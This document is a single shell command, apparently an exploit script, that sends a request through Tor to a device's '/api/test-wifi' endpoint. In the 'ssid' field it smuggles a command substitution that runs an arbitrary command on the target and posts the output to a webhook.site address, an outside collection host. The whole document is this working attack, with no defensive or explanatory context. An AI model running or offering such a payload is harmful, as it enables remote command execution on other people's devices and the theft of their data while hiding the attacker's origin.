torify curl -X POST "$1/api/test-wifi" -H "Content-Type: application/json" -d '{"ssid":"$(curl -X POST https://webhook.site/'$3'/ -d $('$2'))","password":"lel"}'
